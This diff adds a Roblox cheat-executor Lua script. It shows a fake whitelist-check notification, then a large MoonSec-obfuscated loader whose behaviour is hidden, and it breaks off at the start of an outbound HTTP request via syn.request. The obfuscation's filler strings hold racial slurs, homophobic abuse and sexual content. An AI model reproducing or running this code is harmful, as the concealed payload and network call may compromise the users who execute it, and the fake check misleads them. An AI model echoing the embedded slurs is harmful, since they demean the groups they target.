@@ -1,7 +1,2529 @@
+game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = ".noclips";
+        Text = "Please Wait - Checking Whitelist/Blacklist. If you get kicked, it means you're blacklisted.";
+        Icon = "rbxassetid://4743521545";
+            })
+wait (5)
 
-_, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
+if game.Players.LocalPlayer.UserId == "" then
+game.Players.LocalPlayer:Kick("You're Blacklisted. discord.gg/5uZtux2QKe for an appeal.")
+end
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = ".noclips";
+        Text = "Success, you're whitelisted.";
+        Icon = "rbxassetid://375691700";
+            })
 
 
-,nil,nil;(function() _msec=(function(n,e,l)local V=e[" ​         "];local J=l[n[(0x312+-110)]][n["             ​"]];local x=(-#{92,'nil',143;1;1;1;(function()return#{('hBkloM'):find("\107")}>0 and 1 or 0 end)}+11)/(0xba/(-#'impulse was here omg'+(-18+(255+-0x7c))))local r=(-#[[this is a meme string]]+(0x64-(-#'Only a to Z 0 to 9 is allowed'+(0x83+((-0xd38/188)+-#[[ÑÑÑÑÑÑÑ]])))))-(130/0x82)local Y=l[n[(0x85a1/189)]][n["                "]];local A=((135+(((-#"I hate black people"+(-20770+0x2864))+-79)/0x5e))+-#[[I FUCKING HATE FEMBOYS]])+(0xf4/122)local s=l[n[(0x47b-582)]][n["               "]]local a=(-#"cruz pp is large"+(0x3ba/53))-(((269-0xac)+-70)-0x1a)local v=(6+-#{'nil';95;95})local c=(0x35+(0x28+((((5351+-0x47)/165)+-107)+-#"W4rboy was here")))local p=((((0x7+((-0x3c+12)+-#'heil eco mother fuckers'))+-#[[how do i get moonsex v3]])+0x6e)-20)local f=(0x47-((((-0x3c+-65)+19157)/0xf4)+-#"bigchungus"))local t=(-#{(function()return{','}end)(),(function()return{','}end)(),(function()return{','}end)(),{},1}+8)local g=((0x1d5+((28+(-3-0x23))+-#"psx dupe is abd"))/0x94)local M=((-209-(-0x3c78/((0x1af-247)+-#"mike litoris")))+0x7b)local S=(-#{'nil';164,{}}+7)local I=(-#"if true then return your dad"+((-#[[howtodumpscript]]+(359-(-#[[waste of sperm]]+((25-0x2d)+0xe3))))-0x77))local E=(10+-#{32,(function()return{','}end)(),",",{};(function()return#{('plOpbp'):find("\79")}>0 and 1 or 0 end),'nil'})local D=(-#"Deeznutsbutinlualoo"+(0xa1-(356-((-#"brawl stars hard gay porn shelly nsked minecraft gay porn roblox rule34 hot"+(0x14b1f-(-#{(function()return{','}end)(),(function()return{','}end)(),'nil';39,101;(function()return#{('mFmoKB'):find("\109")}>0 and 1 or 0 end)}+42406)))/0xc2))))local z=(-#'FranzJPresents'+((17-(65+-#{{};1,'}',{}}))+62))local k=((-#'i fucked your dad'+(((((-44+-0x2dab1)+-#'Niggabyte')/0x36)/0x4d)+428))/0xb7)local w=(0x16e/((-32+(0x25-69))+0xf7))local b=((-#{{},",",",";(function()return{','}end)(),75,1}+88)+-80)local h=(((-#"moonsec got deobfuscated"+(0x4970/((28439+-#{{};{};",";{}})/121)))+-0x2d)+-#'0nly segc')local u=((-#'Negro'+(-118+(-#[[impulse was here pastebin reel]]+(377-((551-0x137)+-#[[nate higger nuck figgers and nill kiggers]])))))+-0x17)local m=((-0x14b4/(-#'0nly 1337 smashed ur wap'+(186-(0xfd-141))))+0x6c)local L=n[(-#"paidlancer"+(0x5a7+-78))];local H=l[n[(0x45ff/99)]][n[" ​            "]];local G=l[(function(e)return type(e):sub(1,1)..'\101\116'end)('​       ')..'\109\101'..('\116\97'or'        ')..n[(0x268+-51)]];local B=l[n[(-79+0x284)]][n[" ​   ​    "]];local N=(100/0x32)-(0x44/((83+-0x20)+-17))local j=((1512/((-7040/0x58)+0xbc))+-#'Lana Rhoades')-(-#"0nly 1337 smashed ur wap"+(0x9f-133))local K=l[n[(0x7d25/177)]][n["         "]];local e=function(e,n)return e..n end local F=(-#{168;'}',",",",",'}';{};'nil'}+11)*(-#[[lego hax]]+(((0x731f730/(339+-0x6c))/0xbf)/228))local C=l[n["   ​         "]];local i=(0x6b-105)*((0xabf0/(27248/0xd0))-0xd0)local O=(((0x904+-121)-1144)+-#[[Deeznutsbutinlualoo]])*(-#'null'+((-#'cruz pp is large'+(250/(41+-0x24)))+-0x1c))local P=(-#[[mama mo]]+((-96+(-#"freerobuxphone"+(16+-0x1c)))+0xb5))local y=(((10-0x28)+124)-92)*(103-0x65)local _=l[n["            "]]or l[n[(-#[[if true then return your dad]]+(0x14b3f/143))]][n["            "]];local o=(-106+(((-166+0x2e)+495)+-#'Daddy fuck me'))local n=l[n["                 "]];local B=(function(o)local i,l=3,0x10 local n={j={},v={}}local d=-a local e=l+r while true do n[o:sub(e,(function()e=i+e return e-r end)())]=(function()d=d+a return d end)()if d==(F-a)then d=""l=N break end end local d=#o while e<d+r do n.v[l]=o:sub(e,(function()e=i+e return e-r end)())l=l+a if l%x==N then l=j B(n.j,(K((n[n.v[j]]*F)+n[n.v[a]])))end end return s(n.j)end)("..:::MoonSec::..                ​               ​                ​                                       ​​​ ​             ​                ​                ​                 ​                      ​     ​ ​        ​               ​                ​                  ​                  ​        ​     ​ ​  ​      ​                          ​                                 ​      ​                  ​​​              ​                ​                                    ​                        ​    ​ ​                          ​ ​                               ​                      ​          ​ ​      ​                  ​                               ​              ​                          ​​​ ​   ​                                            ​                                        ​             ​  ​            ​   ​                                   ​                         ​        ​ ​ ​  ​     ​          ​                                 ​     ​              ​                ​​​                                     ​                                      ​     ​   ​        ​     ​ ​                                                               ​                                   ​ ​ ​  ​               ​      ​                           ​                                           ​​​ ​  ​                                             ​                 ​                      ​     ​ ​       ​                ​                                 ​                      ​        ​ ​ ​  ​                ​                 ​                 ​                                      ​​​ ​   ​                         ​                ​                ​                      ​ ​     ​ ​           ​             ​                                ​                                 ​ ​      ​      ​                          ​                ​                                                         ​                ​          ​ ​       ​                              ​   ​          ​                  ​        ​   ​  ​ ​   ​                         ​                        ​                                   ​          ​​                                            ​    ​                                                                    ​      ​                                    ​          ​                     ​         ​               ​                                       ​                ​                        ​                          ​                      ​​     ​         ​                             ​            ​                ​                           ​     ​           ​        ​       ​    ​                                                                   ​          ​                  ​   ​    ​            ​      ​                                                                          ​ ​   ​    ​       ​    ​                                   ​      ​                               ​              ​        ​                                                    ​  ​                                        ​                   ​             ​                                  ​                                                     ​   ​           ​        ​                       ​ ​                                ​     ​​​       ​                                         ​ ​         ​  ​                      ​     ​     ​          ​   ​                    ​                                                               ​ ​ ​   ​      ​           ​                                     ​​     ​                                         ​                   ​               ​                                 ​         ​                 ​                       ​             ​     ​                                                     ​       ​ ​                                      ​          ​                                     ​   ​  ​     ​     ​   ​                           ​                                   ​                                             ​                         ​                                   ​                          ​ ​                                                        ​                                    ​                    ​    ​ ​ ​                     ​         ​ ​    ​​                                                                    ​                     ​         ​                            ​                           ​                                           ​         ​                                                            ​                                ​                                                           ​​                ​                   ​        ​  ​              ​                     ​ ​                              ​                                 ​   ​ ​         ​                              ​              ​                                       ​    ​      ​ ​       ​                      ​                 ​​​ ​             ​                ​                                 ​ ​                          ​ ​          ​                    ​               ​                                                        ​ ​  ​​               ​                 ​      ​     ​                         ​                   ​ ​ ​            ​                 ​               ​                   ​");local s=(86-0x50)local d=111 local l=a;local n={}n={[((105-0x5c)+-#"Lana Rhoades")]=function()local e,n,a,r=Y(B,l,l+A);l=l+y;d=(d+(s*y))%o;return(((r+d-(s)+i*(y*x))%i)*((x*O)^x))+(((a+d-(s*x)+i*(x^A))%o)*(i*o))+(((n+d-(s*A)+O)%o)*i)+((e+d-(s*y)+O)%o);end,[(0x2b+-41)]=function(e,e,e)local e=Y(B,l,l);l=l+r;d=(d+(s))%o;return((e+d-(s)+O)%i);end,[((275-0xa2)+-110)]=function()local n,e=Y(B,l,l+x);d=(d+(s*x))%o;l=l+x;return(((e+d-(s)+i*(x*y))%i)*o)+((n+d-(s*x)+o*(x^A))%i);end,[((147-0x77)+-#"0nly 1337 smashed ur wap")]=function(n,e,l)if l then local e=(n/x^(e-a))%x^((l-r)-(e-a)+r);return e-e%a;else local e=x^(e-r);return(n%(e+e)>=e)and a or j;end;end,[(((324-0xb2)+-#[[mike litoris]])-0x81)]=function()local e=n[(0x61-96)]();local l=n[(39/0x27)]();local c=a;local d=(n[((327/0x3)+-0x69)](l,r,F+y)*(x^(F*x)))+e;local e=n[(0x8c/((70+-0x1a)+-#'0nly segc'))](l,21,31);local n=((-a)^n[(0x43-63)](l,32));if(e==j)then if(d==N)then return n*j;else e=r;c=N;end;elseif(e==(i*(x^A))-r)then return(d==j)and(n*(r/N))or(n*(j/N));end;return J(n,e-((o*(y))-a))*(c+(d/(x^P)));end,[(-#[[arab porn]]+(0x41+-50))]=function(e,x,x)local x;if(not e)then e=n[((9870/0x69)-93)]();if(e==j)then return'';end;end;x=H(B,l,l+e-a);l=l+e;local e=''for n=r,#x do e=L(e,K((Y(H(x,n,n))+d)%o))d=(d+s)%i end return e;end}local function H(...)return{...},C('#',...)end local function B()local b={};local u={};local e={};local c={b,u,nil,e};local l={}local w=(287-0xcb)local e={[(28+-0x1a)]=(function(e)return not(#e==n[(-#'brawl stars hard gay porn shelly nsked minecraft gay porn roblox rule34 hot'+(17248/0xe0))]())end),[(0x45-68)]=(function(e)return n[(-0x58+93)]()end),[((0xeb-144)+-#[[MSC 793z487nhvcgsdfgsudfza9889jgvz56gz56z547684z5g54z948g56z74j56475jzg645z6456 oh wait]])]=(function(e)return n[((0x3b+((-0x23+9)+-#[[windows xp startup sfx]]))+-#"Bwomp")]()end),[(-#"i bought a boost for this string"+(142+-0x6b))]=(function(e)local l=n[(-#[[papier der afghaner wurde von nice dem bombenleger gefickt]]+(4608/0x48))]()local n=''local e=1 for d=1,#l do e=(e+w)%o n=L(n,K((Y(l:sub(d,d))+e)%i))end return n end)};for e=r,n[(99-0x62)]()do u[e-r]=B();end;c[3]=n[(87-0x55)]();local d=n[(72-0x47)]()for d=1,d do local n=n[(386/0xc1)]();local o;local e=e[n%(0x72-83)];l[d]=e and e({});end;for c=1,n[(15/0xf)]()do local e=n[(-83+(-30+0x73))]();if(n[(112/0x1c)](e,a,r)==N)then local i=n[(((-18+0x100)+-#"papier der afghaner wurde von nice dem bombenleger gefickt")/45)](e,x,A);local d=n[(0x48-68)](e,y,x+y);local e={n[(94-0x5b)](),n[(69+-0x42)](),nil,nil};local o={[(-#'psx real dupe steal all ur pets no joke'+((0x11b-157)-87))]=function()e[t]=n[((6954/0x39)-0x77)]();e[z]=n[(-33+0x24)]();end,[(120+(-59+-0x3c))]=function()e[g]=n[(172/0xac)]();end,[(48/0x18)]=function()e[t]=n[((0xd-32)+20)]()-(x^F)end,[(-#[[how do i get moonsex v3]]+(0x84+-106))]=function()e[f]=n[(91-0x5a)]()-(x^F)e[D]=n[(-#'arab porn'+(-0x75+129))]();end};o[i]();if(n[(0x84-128)](d,r,a)==r)then e[k]=l[e[h]]end if(n[((-94+0x6b)+-#'0nly 1337')](d,x,x)==a)then e[t]=l[e[t]]end if(n[(0x388/226)](d,A,A)==r)then e[S]=l[e[z]]end b[c]=e;end end;return c;end;local function j(n,y,s)local i=n[x];local d=n[A];local O=n[a];return(function(...)local Y=H local l={};local n=d;local B={...};local A=-r;local N={};local K={};local d=a;local o=C('#',...)-r;local F=i;local i=O;for e=0,o do if(e>=n)then K[e-n]=B[e+r];else l[e]=B[e+a];end;end;local n=o-n+a local n;local o;while true do n=i[d];o=n[(0x8b/139)];e=(8383606)while(0x62-62)>=o do e=-e e=(1589085)while(-0x3d+78)>=o do e=-e e=(2701365)while o<=(0x3b-(148-0x61))do e=-e e=(25398)while(0x60/32)>=o do e=-e e=(689013)while((-0x48+80)+-#"mf stfu")>=o do e=-e e=(2724620)while(-25+0x19)<o do e=-e local e=n[u]l[e]=l[e](l[e+r])break end while(e)/((420238/0xb6))==1180 do if(l[n[u]]==l[n[z]])then d=d+r;else d=n[p];end;break end;break;end while 351==(e)/((2028+-0x41))do e=(12334884)while o>(-0x11+19)do e=-e do return end;break end while 3093==(e)/((-#[[lego hax]]+(15984/0x4)))do l[n[h]]=l[n[f]]%n[E];break end;break;end break;end while(e)/((0xc1d-1607))==17 do e=(1195072)while(0x5c-87)>=o do e=-e e=(4997700)while(976/(585-0x155))<o do e=-e l[n[w]]=j(F[n[g]],nil,s);break end while(e)/((0x20094/81))==3085 do local d=n[m];local e=l[n[c]];l[d+1]=e;l[d]=e[n[M]];break end;break;end while(e)/((0x849-1069))==1136 do e=(2547036)while o<=(-0x55+91)do e=-e local e=n[u];local o=l[e]local a=l[e+2];if(a>0)then if(o>l[e+1])then d=n[p];else l[e+3]=o;end elseif(o<l[e+1])then d=n[g];else l[e+3]=o;end break;end while 3054==(e)/(((0x4566/21)+-#[[Suck Sus0587]]))do e=(785232)while o>((1445/0x55)+-#'send nudes')do e=-e l[n[b]]=j(F[n[f]],nil,s);break end while(e)/(((70596/0xde)+-#'FranzJPresents'))==2583 do local a=F[n[f]];local o;local e={};o=G({},{__index=function(l,n)local e=e[n];return e[1][e[2]];end,__newindex=function(d,l,n)local e=e[l]e[1][e[2]]=n;end;});for o=1,n[M]do d=d+r;local n=i[d];if n[((1390/0x8b)+-#'kys nigga')]==43 then e[o-1]={l,n[g]};else e[o-1]={y,n[p]};end;N[#N+1]=e;end;l[n[u]]=j(a,o,s);break end;break;end break;end break;end break;end while(e)/((2219-0x464))==2467 do e=(107950)while o<=(972/0x51)do e=-e e=(5620160)while(0x59-79)>=o do e=-e e=(1586966)while o>(81-0x48)do e=-e local e=n[h]l[e]=l[e](_(l,e+a,A))break end while(e)/((209442/0xc9))==1523 do l[n[m]]=#l[n[c]];break end;break;end while 2080==(e)/((-#'alivephoneluaLMAO'+(0xad6+-55)))do e=(1591044)while o>(0x268/56)do e=-e local d=n[h];local e=l[n[p]];l[d+1]=e;l[d]=e[n[z]];break end while(e)/((3738-0x771))==868 do l[n[h]]=#l[n[c]];break end;break;end break;end while(e)/((0x3278/76))==635 do e=(1718910)while o<=(-52+0x42)do e=-e e=(12655764)while(0x2e-33)<o do e=-e l[n[u]]={};break end while 3551==(e)/((-0x62+3662))do if(l[n[m]]~=l[n[D]])then d=d+r;else d=n[c];end;break end;break;end while 538==(e)/((-#'Gay porn'+(723878/((0x137+-77)+-#[[lego hax]]))))do e=(3418371)while(-#'0nly was here mf'+(3100/0x64))>=o do e=-e if(l[n[b]]~=n[I])then d=d+r;else d=n[f];end;break;end while 3139==(e)/(((0x41f1c/244)+-#"nico der hurensohn"))do e=(7867936)while o>(56+-0x28)do e=-e d=n[t];break end while 3463==(e)/((-#[[mf stfu]]+(0x903+-28)))do l[n[w]]=y[n[p]];break end;break;end break;end break;end break;end break;end while 3555==(e)/((-#[[0nly was here mf]]+(108342/0xea)))do e=(6911754)while o<=(0x87-(15260/0x8c))do e=-e e=(4419721)while o<=(152-0x83)do e=-e e=(4052262)while o<=(122+-0x67)do e=-e e=(3725838)while o>(0xbe2/169)do e=-e l[n[m]]=(n[c]~=0);break end while(e)/((19620/0x14))==3798 do l[n[w]]=l[n[f]][l[n[z]]];break end;break;end while(e)/((3183+-0x31))==1293 do e=(8396968)while o>(-#"testpsx dupe no scam legit 2022 free no virus"+(-0x15+86))do e=-e l[n[b]]=s[n[v]];break end while(e)/((-#'kys nigga'+(375540/(-56+0xdd))))==3704 do l[n[h]]=(n[c]~=0);d=d+r;break end;break;end break;end while 4007==(e)/((225012/0xcc))do e=(8320770)while o<=(-0x5a+113)do e=-e e=(1302452)while o>((5544/0x4d)+-#"da hood money generator 2022 working free no virus")do e=-e do return end;break end while 359==(e)/(((123658/0x22)+-#'Deezbutts'))do l[n[w]]=y[n[t]];d=d+a;n=i[d];l[n[h]]=#l[n[c]];d=d+a;n=i[d];y[n[t]]=l[n[w]];d=d+a;n=i[d];l[n[u]]=y[n[v]];d=d+a;n=i[d];l[n[u]]=#l[n[t]];d=d+a;n=i[d];y[n[g]]=l[n[w]];d=d+a;n=i[d];do return end;break end;break;end while(e)/((0x18c2-3204))==2655 do e=(2417786)while o<=(-#'Daddy fuck me'+((-#'free pornhub premium'+(0x1e1-286))-138))do e=-e l[n[m]]=l[n[t]]%n[z];break;end while(e)/((-84+0xcfd))==746 do e=(1802836)while(79+-0x36)<o do e=-e local e=n[u]l[e]=l[e](_(l,e+a,n[v]))break end while(e)/((37989/0x51))==3844 do if l[n[k]]then d=d+a;else d=n[g];end;break end;break;end break;end break;end break;end while(e)/((3757-0x768))==3714 do e=(2450245)while(0xa3-132)>=o do e=-e e=(828705)while(-#[[algebra]]+(0x61-62))>=o do e=-e e=(1017396)while o>(121-0x5e)do e=-e local e=n[w];local a=l[e+2];local o=l[e]+a;l[e]=o;if(a>0)then if(o<=l[e+1])then d=n[f];l[e+3]=o;end elseif(o>=l[e+1])then d=n[t];l[e+3]=o;end break end while 1062==(e)/((-0x3a+1016))do l[n[w]]();break end;break;end while 505==(e)/(((3425-((0xdfa-1816)+-#"mama mo"))+-#"use luraph if want lost money"))do e=(3677634)while(-0x36+83)>=o do e=-e do return l[n[h]]end break;end while 1038==(e)/(((0x1be5-(0x1c58-3670))+-#[[deadphonelua]]))do e=(52836)while((0x387f-7263)/0xf0)<o do e=-e l[n[u]]=l[n[f]][n[I]];break end while 204==(e)/((13727/0x35))do local e={l,n};e[r][e[x][w]]=e[a][e[x][z]]+e[r][e[x][v]];break end;break;end break;end break;end while(e)/((0x843dc/212))==959 do e=(2560714)while o<=(0x1923/195)do e=-e e=(3890500)while(0x640/50)<o do e=-e s[n[c]]=l[n[h]];d=d+a;n=i[d];l[n[w]]={};d=d+a;n=i[d];l[n[w]]={};d=d+a;n=i[d];s[n[t]]=l[n[b]];d=d+a;n=i[d];l[n[m]]=s[n[t]];d=d+a;n=i[d];if(l[n[h]]~=n[M])then d=d+r;else d=n[c];end;break end while 3100==(e)/((35140/0x1c))do local e=n[b]l[e](l[e+r])break end;break;end while 1937==(e)/((1352+-0x1e))do e=(5854140)while(131-0x61)>=o do e=-e local e=n[k];local o=l[e]local a=l[e+2];if(a>0)then if(o>l[e+1])then d=n[t];else l[e+3]=o;end elseif(o<l[e+1])then d=n[g];else l[e+3]=o;end break;end while(e)/((0x756+-120))==3330 do e=(1938321)while(-95+0x82)<o do e=-e if(l[n[b]]~=n[D])then d=d+r;else d=n[v];end;break end while(e)/(((0x165b-2905)+-#"impulse loves moonsex"))==693 do l[n[w]]=(n[f]~=0);break end;break;end break;end break;end break;end break;end break;end while 2222==(e)/((-#"impulse was here omg"+(857218/0xe2)))do e=(70725)while(0x8a-83)>=o do e=-e e=(1982680)while o<=(((29312/0xe5)+-58)+-#[[cilerteddoesntlikeburgers]])do e=-e e=(12719272)while(7240/0xb5)>=o do e=-e e=(6997188)while o<=(-64+0x66)do e=-e e=(11869434)while(0xb9/(0x6d-104))<o do e=-e s[n[f]]=l[n[h]];break end while 2946==(e)/((-#"impulse was here omg"+(-0x14+4069)))do local d=n[t];local e=l[d]for n=d+1,n[S]do e=e..l[n];end;l[n[k]]=e;break end;break;end while(e)/((0x1557-2779))==2607 do e=(8966445)while(80+-0x29)<o do e=-e local e=n[h]local d,n=Y(l[e](_(l,e+1,n[v])))A=n+e-1 local n=0;for e=e,A do n=n+a;l[e]=d[n];end;break end while(e)/(((706484/0xef)+-0x7b))==3165 do l[n[u]]=l[n[t]]-l[n[D]];break end;break;end break;end while(e)/((7262-0xe56))==3541 do e=(8641215)while o<=(0xc2-152)do e=-e e=(9155388)while((0xcc-146)+-#"i fucked your dad")<o do e=-e local e=n[k]l[e](l[e+r])break end while(e)/((0x85b96/193))==3226 do l[n[k]]={};break end;break;end while(e)/((0x73a10/208))==3795 do e=(684200)while o<=(-#'lego hax'+(0x83-80))do e=-e l[n[u]]=l[n[f]];break;end while 3110==(e)/((0xab04/199))do e=(16352)while o>(-114+0x9e)do e=-e l[n[u]]=l[n[t]][n[S]];break end while 32==(e)/((0x244+-69))do l[n[u]]=(n[t]~=0);d=d+r;break end;break;end break;end break;end break;end while(e)/((0xbbf+-87))==679 do e=(12290027)while(-37+0x57)>=o do e=-e e=(1851595)while o<=(0x88-89)do e=-e e=(5564916)while((-0x1109/89)+95)<o do e=-e local e=n[k]l[e]=l[e](_(l,e+a,A))break end while(e)/((-102+0x5fa))==3897 do local e=n[u]local d,n=Y(l[e](_(l,e+1,n[v])))A=n+e-1 local n=0;for e=e,A do n=n+a;l[e]=d[n];end;break end;break;end while 677==(e)/((-0x51+2816))do e=(371677)while o<=(-0x64+148)do e=-e s[n[c]]=l[n[h]];break;end while(e)/(((0x233cd-72179)/0x56))==443 do e=(522153)while o>(11760/0xf0)do e=-e l[n[m]]=n[p];break end while(e)/(((0x635-810)+-#'Me be like at 5am in the morning'))==699 do l[n[h]][l[n[t]]]=l[n[M]];break end;break;end break;end break;end while(e)/((0x68907/105))==3013 do e=(282285)while o<=(0xfa4/77)do e=-e e=(1772448)while(8109/(412-0xfd))<o do e=-e local d=n[c];local e=l[d]for n=d+1,n[I]do e=e..l[n];end;l[n[w]]=e;break end while 1776==(e)/((0x420+-58))do if l[n[k]]then d=d+a;else d=n[g];end;break end;break;end while(e)/((0x35ca/102))==2091 do e=(9163488)while(10441/0xc5)>=o do e=-e l[n[m]]=l[n[f]]-l[n[I]];break;end while 2544==(e)/((7237-0xe33))do e=(1052436)while(12960/0xf0)<o do e=-e do return l[n[k]]end break end while 2211==(e)/((-0x60+572))do l[n[b]][l[n[c]]]=l[n[M]];break end;break;end break;end break;end break;end break;end while 115==(e)/((1332-0x2cd))do e=(9577224)while(-50+0x72)>=o do e=-e e=(6954402)while(-#'bigchungus'+(0x40f5/241))>=o do e=-e e=(1543806)while o<=(0x720/32)do e=-e e=(9348)while(132-0x4c)<o do e=-e l[n[w]]=n[c];break end while(e)/(((4845/0x13)+-#'Nsrds GAYYYYAIAHAKAJAVAHAUA'))==41 do local o;local t,x;local r;local e;s[n[c]]=l[n[b]];d=d+a;n=i[d];l[n[k]]=s[n[c]];d=d+a;n=i[d];l[n[h]]=s[n[g]];d=d+a;n=i[d];e=n[h];r=l[n[f]];l[e+1]=r;l[e]=r[n[E]];d=d+a;n=i[d];l[n[h]]=n[c];d=d+a;n=i[d];l[n[u]]=(n[c]~=0);d=d+a;n=i[d];e=n[u]t,x=Y(l[e](_(l,e+1,n[p])))A=x+e-1 o=0;for e=e,A do o=o+a;l[e]=t[o];end;d=d+a;n=i[d];e=n[u]l[e]=l[e](_(l,e+a,A))d=d+a;n=i[d];l[n[h]]();d=d+a;n=i[d];do return end;break end;break;end while 1518==(e)/((0x1c8db/115))do e=(8977800)while o>(233-0xaf)do e=-e local r;local o;local e;l[n[h]]=n[v];d=d+a;n=i[d];l[n[u]]=n[f];d=d+a;n=i[d];l[n[b]]=#l[n[t]];d=d+a;n=i[d];l[n[b]]=n[c];d=d+a;n=i[d];e=n[b];o=l[e]r=l[e+2];if(r>0)then if(o>l[e+1])then d=n[p];else l[e+3]=o;end elseif(o<l[e+1])then d=n[v];else l[e+3]=o;end break end while(e)/((-0x6e+4010))==2302 do local e={l,n};e[r][e[x][h]]=e[a][e[x][E]]+e[r][e[x][c]];break end;break;end break;end while 3523==(e)/(((((73206/0x12)+-#[[Deezbutts]])-0x81f)+-#"negus"))do e=(187249)while(0xad-112)>=o do e=-e e=(307720)while o>(-113+0xad)do e=-e local v;local o;local y;local e;l[n[m]]=s[n[g]];d=d+a;n=i[d];l[n[h]]=l[n[t]][n[M]];d=d+a;n=i[d];e=n[k];y=l[n[c]];l[e+1]=y;l[e]=y[n[I]];d=d+a;n=i[d];l[n[w]]=l[n[t]];d=d+a;n=i[d];l[n[b]]=l[n[f]];d=d+a;n=i[d];e=n[k]l[e]=l[e](_(l,e+a,n[t]))d=d+a;n=i[d];e=n[m];y=l[n[g]];l[e+1]=y;l[e]=y[n[M]];d=d+a;n=i[d];e=n[h]l[e]=l[e](l[e+r])d=d+a;n=i[d];o={l,n};o[r][o[x][u]]=o[a][o[x][S]]+o[r][o[x][p]];d=d+a;n=i[d];l[n[k]]=l[n[c]]%n[D];d=d+a;n=i[d];e=n[b]l[e]=l[e](l[e+r])d=d+a;n=i[d];y=n[g];v=l[y]for e=y+1,n[z]do v=v..l[e];end;l[n[b]]=v;d=d+a;n=i[d];o={l,n};o[r][o[x][m]]=o[a][o[x][E]]+o[r][o[x][c]];d=d+a;n=i[d];l[n[b]]=l[n[g]]%n[z];break end while 490==(e)/((0x517-675))do if(l[n[b]]~=l[n[I]])then d=d+r;else d=n[c];end;break end;break;end while(e)/((0x83f85/153))==53 do e=(11225151)while((260-((0x18d3/31)+-#'atakan der nigga'))+-#[[Crackzzzz]])>=o do e=-e local e=n[w]l[e]=l[e](l[e+r])break;end while(e)/((7664-0xf21))==2961 do e=(7233958)while o>(-#'Me be like at 5am in the morning'+(0x104-165))do e=-e y[n[p]]=l[n[b]];break end while 1927==(e)/((-#'made by kim jong un'+((-44+0x1d7cc)/32)))do local a=F[n[f]];local o;local e={};o=G({},{__index=function(l,n)local e=e[n];return e[1][e[2]];end,__newindex=function(d,n,l)local e=e[n]e[1][e[2]]=l;end;});for o=1,n[z]do d=d+r;local n=i[d];if n[(0x52/82)]==43 then e[o-1]={l,n[f]};else e[o-1]={y,n[c]};end;N[#N+1]=e;end;l[n[h]]=j(a,o,s);break end;break;end break;end break;end break;end while(e)/((-#"mf stfu"+(5505-0xad3)))==3512 do e=(6334236)while o<=(((10764/0x27)-191)+-#[[warboy hates you]])do e=-e e=(5106108)while(8976/0x88)>=o do e=-e e=(329015)while((0x138d/65)+-#[[impulse 2022]])<o do e=-e local e=n[b]l[e]=l[e](_(l,e+a,n[g]))break end while 115==(e)/((0x9579e/214))do l[n[b]]=s[n[f]];break end;break;end while 1366==(e)/((0x1d9d-(441945/0x73)))do e=(8589646)while o<=(0x66+-35)do e=-e y[n[c]]=l[n[b]];break;end while 3271==(e)/(((0xada+-107)+-#[[testpsx dupe no scam legit 2022 free no virus]]))do e=(4926600)while(147+-0x4f)<o do e=-e l[n[m]]=l[n[c]][l[n[E]]];break end while(e)/((-#[[howtodumpscript]]+(279727/0x59)))==1575 do local e=n[b];local a=l[e+2];local o=l[e]+a;l[e]=o;if(a>0)then if(o<=l[e+1])then d=n[v];l[e+3]=o;end elseif(o>=l[e+1])then d=n[t];l[e+3]=o;end break end;break;end break;end break;end while(e)/((0x280c2/78))==3012 do e=(4723736)while(-0x3e+133)>=o do e=-e e=(3747960)while(0x11c6/65)<o do e=-e l[n[h]]=l[n[f]];break end while(e)/((3524-(-#'I FUCKING HATE FEMBOYS'+(0xe76-1896))))==2154 do l[n[k]]=y[n[p]];break end;break;end while(e)/(((0xa5b73/159)-2177))==2258 do e=(12150800)while((0xe1-(0x13b-167))+-#[[Negro]])>=o do e=-e d=n[c];break;end while(e)/((-#"0nly 1337"+(7501-0xed0)))==3284 do e=(1331274)while o>(0x37e4/196)do e=-e if(l[n[b]]==l[n[S]])then d=d+r;else d=n[p];end;break end while 3279==(e)/(((0x1ca+-32)+-#'free pornhub premium'))do l[n[k]]();break end;break;end break;end break;end break;end break;end break;end d=d+a;end;end);end;return j(B(),{},V())()end)_msec({[(-#"how do i get moonsex v3"+(8160/0x28))]='\115\116'..(function(e)return(e and'  ​​   ​   ')or'\114\105'or'\120\58'end)((0x4a-69)==(122-0x74))..'\110g',["             ​"]='\108\100'..(function(e)return(e and'         ​   ')or'\101\120'or'\119\111'end)(((0x780/128)+-#[[paidlancer]])==(81+-0x4b))..'\112',["                "]=(function(e)return(e and'       ​       ')and'\98\121'or'\100\120'end)((0x20d/105)==(235/0x2f))..'\116\101',["         "]='\99'..(function(e)return(e and'       ​​')and'\90\19\157'or'\104\97'end)(((0x64-66)+-#[[use luraph if want lost money]])==(0x24f/197))..'\114',[(1203-0x27e)]='\116\97'..(function(e)return(e and'        ')and'\64\113'or'\98\108'end)(((56+-0x1e)+-#"sex in fortnite real")==(87-0x52))..'\101',[" ​            "]=(function(e)return(e and'        ')or'\115\117'or'\78\107'end)((309/0x67)==(2945/0x5f))..'\98',["               "]='\99\111'..(function(e)return(e and'                  ')and'\110\99'or'\110\105\103\97'end)((0x55-54)==(0x7c/4))..'\97\116',[(722+-0x2e)]=(function(e,n)return(e and'              ')and'\48\159\158\188\10'or'\109\97'end)((-#'i bought a boost for this string'+(0x6e-73))==(-#"If LocalPlayer equals Dumbass then while true do end"+(58/(-#"warboy hates you"+(130-0x71)))))..'\116\104',[(1392+-0x21)]=(function(n,e)return(((0x2bc/50)+-#"kys nigga")==((0x50-57)+-#"get good use moonsec")and'\48'..'\195'or n..((not'\20\95\69'and'\90'..'\180'or e)))or'\199\203\95'end),[" ​   ​    "]='\105\110'..(function(e,n)return(e and'     ​  ')and'\90\115\138\115\15'or'\115\101'end)((0x16d/73)==(-#'windows xp startup sfx'+(0xe8-179)))..'\114\116',["            "]='\117\110'..(function(e,n)return(e and'        ​         ')or'\112\97'or'\20\38\154'end)((0x87-(0xe4+-98))==(69+-0x26))..'\99\107',["   ​         "]='\115\101'..(function(e)return(e and'             ')and'\110\112\99\104'or'\108\101'end)((-#[[legend says i was here]]+(53+-0x1a))==(-#[[ÑÑÑÑÑÑÑ]]+(0x876/57)))..'\99\116',["                 "]='\116\111\110'..(function(e,n)return(e and'               ')and'\117\109\98'or'\100\97\120\122'end)((38-0x21)==(-0x61+102))..'\101\114'},{[" ​         "]=((getfenv)or(function()return(_ENV)end))},((getfenv)or(function()return(_ENV)end))()) end)()
+ local HttpService = game:GetService'HttpService'
+local n = Replicated
+local a = Name
+local n = Poop
+local o = Sex
+local Request = syn and syn.request or request
+Request({
